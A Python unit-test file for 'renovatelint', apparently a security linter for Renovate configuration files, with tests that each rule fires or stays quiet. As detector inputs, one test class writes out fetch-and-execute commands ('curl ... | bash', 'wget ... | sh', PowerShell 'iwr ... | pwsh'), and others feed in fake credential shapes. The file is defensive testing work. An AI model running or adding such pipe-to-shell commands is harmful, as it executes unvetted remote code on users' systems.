"""Per-rule positive-and-negative discrimination tests for renovatelint."""

from __future__ import annotations

import unittest

from tests.support import (
    bearer_assignment,
    bidi_char,
    control_char,
    fake_aws_key,
    fake_github_token,
    fake_jwt,
    pem_header,
    pua_char,
    rule_ids,
    scan_dict,
    tag_char,
    zw_char,
)

from renovatelint.types import Options


class EnabledFalseTests(unittest.TestCase):
    def test_fires_when_enabled_false(self):
        findings = scan_dict({"enabled": False})
        self.assertIn("RNV-001", rule_ids(findings))

    def test_quiet_when_enabled_true_or_absent(self):
        self.assertNotIn("RNV-001", rule_ids(scan_dict({"enabled": True})))
        self.assertNotIn("RNV-001", rule_ids(scan_dict({})))


class RootAutomergeTests(unittest.TestCase):
    def test_fires_when_automerge_and_no_quarantine(self):
        findings = scan_dict({"automerge": True})
        self.assertIn("RNV-002", rule_ids(findings))

    def test_quiet_when_automerge_with_root_quarantine(self):
        findings = scan_dict({
            "automerge": True,
            "minimumReleaseAge": "14 days",
        })
        self.assertNotIn("RNV-002", rule_ids(findings))

    def test_quiet_when_automerge_with_packagerule_quarantine(self):
        findings = scan_dict({
            "automerge": True,
            "packageRules": [{
                "matchDepTypes": ["devDependencies"],
                "minimumReleaseAge": "14 days",
            }],
        })
        self.assertNotIn("RNV-002", rule_ids(findings))

    def test_quiet_when_no_automerge(self):
        self.assertNotIn("RNV-002", rule_ids(scan_dict({})))


class ExtendsPinningTests(unittest.TestCase):
    def test_fires_on_unpinned_repo_preset(self):
        findings = scan_dict({
            "extends": ["github>somevendor/renovate-config"],
        })
        self.assertIn("RNV-003", rule_ids(findings))

    def test_quiet_on_tag_pinned_repo_preset(self):
        findings = scan_dict({
            "extends": ["github>somevendor/renovate-config#v2"],
        })
        self.assertNotIn("RNV-003", rule_ids(findings))

    def test_quiet_on_sha_pinned_repo_preset(self):
        findings = scan_dict({
            "extends": [
                "github>somevendor/renovate-config#"
                + "a" * 40,
            ],
        })
        self.assertNotIn("RNV-003", rule_ids(findings))

    def test_quiet_on_builtin_preset(self):
        findings = scan_dict({
            "extends": [
                "config:recommended",
                "schedule:weekends",
                "docker:enableMajor",
                "security:openssf-scorecard",
                "helpers:pinGitHubActionDigests",
            ],
        })
        self.assertNotIn("RNV-003", rule_ids(findings))

    def test_fires_on_gitlab_repo_preset(self):
        findings = scan_dict({
            "extends": ["gitlab>group/renovate-config"],
        })
        self.assertIn("RNV-003", rule_ids(findings))

    def test_fires_on_raw_https_url(self):
        findings = scan_dict({
            "extends": ["https://example.com/renovate-presets.json"],
        })
        self.assertIn("RNV-003", rule_ids(findings))


class CredentialLiteralTests(unittest.TestCase):
    def test_fires_on_github_token_in_host_rules(self):
        findings = scan_dict({
            "hostRules": [{
                "matchHost": "registry.example.com",
                "token": fake_github_token(),
            }],
        })
        self.assertIn("RNV-004", rule_ids(findings))

    def test_fires_on_aws_key_in_env(self):
        findings = scan_dict({
            "env": {"AWS_KEY": fake_aws_key()},
        })
        self.assertIn("RNV-004", rule_ids(findings))

    def test_fires_on_jwt_in_token_field(self):
        findings = scan_dict({"token": fake_jwt()})
        self.assertIn("RNV-004", rule_ids(findings))

    def test_fires_on_pem_header_in_custom_env(self):
        findings = scan_dict({
            "customEnvVariables": {
                "KEY": pem_header() + "\nMIIBVQIB...\n-----END PRIVATE KEY-----",
            },
        })
        self.assertIn("RNV-004", rule_ids(findings))

    def test_fires_on_bearer_assignment(self):
        findings = scan_dict({
            "hostRules": [{
                "matchHost": "x.y",
                "token": bearer_assignment(),
            }],
        })
        self.assertIn("RNV-004", rule_ids(findings))

    def test_quiet_without_credential_shape(self):
        findings = scan_dict({
            "hostRules": [{"matchHost": "x.y", "token": "${TOKEN_ENV_VAR}"}],
        })
        self.assertNotIn("RNV-004", rule_ids(findings))


class FetchAndExecTests(unittest.TestCase):
    def test_fires_on_curl_pipe_bash(self):
        findings = scan_dict({
            "allowedPostUpgradeCommands": [
                "curl -fsSL https://example.com/x.sh | bash"
            ],
        })
        self.assertIn("RNV-005", rule_ids(findings))

    def test_fires_on_wget_pipe_sh(self):
        findings = scan_dict({
            "allowedPostUpgradeCommands": [
                "wget -q -O- https://x.y/z.sh | sh"
            ],
        })
        self.assertIn("RNV-005", rule_ids(findings))

    def test_fires_on_bash_c_subshell(self):
        findings = scan_dict({
            "allowedPostUpgradeCommands": [
                'bash -c "$(curl -fsSL https://x.y/z.sh)"'
            ],
        })
        self.assertIn("RNV-005", rule_ids(findings))

    def test_fires_on_powershell_iwr_pipe(self):
        findings = scan_dict({
            "allowedPostUpgradeCommands": [
                "iwr https://x.y/z.ps1 | pwsh"
            ],
        })
        self.assertIn("RNV-005", rule_ids(findings))

    def test_quiet_on_bare_command(self):
        findings = scan_dict({
            "allowedPostUpgradeCommands": ["node ./scripts/post.js"],
        })
        self.assertNotIn("RNV-005", rule_ids(findings))


class HiddenCharacterTests(unittest.TestCase):
    def test_fires_on_tag_codepoint(self):
        findings = scan_dict({
            "extends": ["config:recommended" + tag_char(0xE0041)],
        }, options=Options())
        self.assertIn("RNV-006", rule_ids(findings))

    def test_fires_on_bidi_override(self):
        findings = scan_dict({
            "timezone": "UTC" + bidi_char(0x202E),
        })
        self.assertIn("RNV-006", rule_ids(findings))

    def test_fires_on_zero_width(self):
        findings = scan_dict({"timezone": "UTC" + zw_char(0x200B)})
        self.assertIn("RNV-006", rule_ids(findings))

    def test_fires_on_control(self):
        findings = scan_dict({"timezone": "UTC" + control_char(0x0001)})
        self.assertIn("RNV-006", rule_ids(findings))

    def test_fires_on_pua(self):
        findings = scan_dict({"timezone": "UTC" + pua_char(0xE100)})
        self.assertIn("RNV-006", rule_ids(findings))

    def test_quiet_on_plain_ascii(self):
        findings = scan_dict({"timezone": "UTC"})
        self.assertNotIn("RNV-006", rule_ids(findings))


class PackageRulesAutomergeScopeTests(unittest.TestCase):
    def test_fires_on_automerge_with_no_match_update_types(self):
        findings = scan_dict({
            "packageRules": [{
                "matchPackagePatterns": ["*"],
                "automerge": True,
            }],
        })
        self.assertIn("RNV-007", rule_ids(findings))

    def test_fires_on_automerge_with_major_in_match_update_types(self):
        findings = scan_dict({
            "packageRules": [{
                "matchUpdateTypes": ["patch", "major"],
                "automerge": True,
            }],
        })
        self.assertIn("RNV-007", rule_ids(findings))

    def test_quiet_on_patch_only_automerge(self):
        findings = scan_dict({
            "packageRules": [{
                "matchUpdateTypes": ["patch", "pin", "digest"],
                "automerge": True,
            }],
        })
        self.assertNotIn("RNV-007", rule_ids(findings))

    def test_quiet_without_automerge(self):
        findings = scan_dict({
            "packageRules": [{
                "matchPackagePatterns": ["*"],
            }],
        })
        self.assertNotIn("RNV-007", rule_ids(findings))


class VulnerabilityAlertsTests(unittest.TestCase):
    def test_fires_on_disabled_vulnerability_alerts(self):
        findings = scan_dict({"vulnerabilityAlerts": {"enabled": False}})
        self.assertIn("RNV-008", rule_ids(findings))

    def test_fires_on_disabled_osv(self):
        findings = scan_dict({"osvVulnerabilityAlerts": False})
        self.assertIn("RNV-008", rule_ids(findings))

    def test_quiet_when_enabled(self):
        findings = scan_dict({
            "vulnerabilityAlerts": {"enabled": True},
            "osvVulnerabilityAlerts": True,
        })
        self.assertNotIn("RNV-008", rule_ids(findings))

    def test_quiet_when_absent(self):
        findings = scan_dict({})
        self.assertNotIn("RNV-008", rule_ids(findings))


class PostUpgradeSurfaceTests(unittest.TestCase):
    def test_fires_on_non_empty_commands(self):
        findings = scan_dict({
            "allowedPostUpgradeCommands": ["node ./scripts/post.js"],
        })
        self.assertIn("RNV-009", rule_ids(findings))

    def test_quiet_on_empty_list(self):
        findings = scan_dict({"allowedPostUpgradeCommands": []})
        self.assertNotIn("RNV-009", rule_ids(findings))

    def test_quiet_on_absent_key(self):
        findings = scan_dict({})
        self.assertNotIn("RNV-009", rule_ids(findings))

    def test_quiet_on_all_blank_entries(self):
        findings = scan_dict({
            "allowedPostUpgradeCommands": ["", "   "],
        })
        self.assertNotIn("RNV-009", rule_ids(findings))


class QuarantineFloorTests(unittest.TestCase):
    def test_fires_on_one_day_quarantine(self):
        findings = scan_dict({"minimumReleaseAge": "1 day"})
        self.assertIn("RNV-010", rule_ids(findings))

    def test_fires_on_compact_hour_quarantine(self):
        findings = scan_dict({"minimumReleaseAge": "72h"})
        self.assertIn("RNV-010", rule_ids(findings))

    def test_quiet_on_two_week_quarantine(self):
        findings = scan_dict({"minimumReleaseAge": "14 days"})
        self.assertNotIn("RNV-010", rule_ids(findings))

    def test_quiet_on_absent_quarantine(self):
        # RNV-010 is "set but too short"; absent is RNV-002 territory,
        # not RNV-010.
        findings = scan_dict({"automerge": True})
        self.assertNotIn("RNV-010", rule_ids(findings))

    def test_option_overrides_quarantine_floor(self):
        opt_strict = Options(min_quarantine_days=30)
        findings = scan_dict({"minimumReleaseAge": "14 days"},
                             options=opt_strict)
        self.assertIn("RNV-010", rule_ids(findings))

    def test_quiet_on_unparseable_value(self):
        findings = scan_dict({"minimumReleaseAge": "someday"})
        self.assertNotIn("RNV-010", rule_ids(findings))


class SchemaAndTimezoneTests(unittest.TestCase):
    def test_schema_fires_when_missing(self):
        findings = scan_dict({})
        self.assertIn("RNV-011", rule_ids(findings))

    def test_schema_quiet_when_set(self):
        findings = scan_dict({
            "$schema": "https://docs.renovatebot.com/renovate-schema.json",
        })
        self.assertNotIn("RNV-011", rule_ids(findings))

    def test_schema_quiet_when_other_schema_url(self):
        # An unrelated $schema URL does not satisfy the Renovate hint
        # check; the finding still fires.
        findings = scan_dict({"$schema": "https://example.com/foo.json"})
        self.assertIn("RNV-011", rule_ids(findings))

    def test_timezone_fires_when_missing(self):
        findings = scan_dict({})
        self.assertIn("RNV-012", rule_ids(findings))

    def test_timezone_quiet_when_set(self):
        findings = scan_dict({"timezone": "America/New_York"})
        self.assertNotIn("RNV-012", rule_ids(findings))


class ScanDictInfoDefaultsTests(unittest.TestCase):
    """The scan_dict helper enables INFO by default; a non-include-info
    Options object should hide RNV-011 and RNV-012."""

    def test_info_hidden_by_default_options(self):
        from renovatelint.rules import run_all
        findings = run_all({}, "x", Options())
        ids = tuple(f.rule_id for f in findings)
        self.assertNotIn("RNV-011", ids)
        self.assertNotIn("RNV-012", ids)

    def test_info_visible_in_strict(self):
        from renovatelint.rules import run_all
        findings = run_all({}, "x", Options(strict=True))
        ids = tuple(f.rule_id for f in findings)
        self.assertIn("RNV-011", ids)
        self.assertIn("RNV-012", ids)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
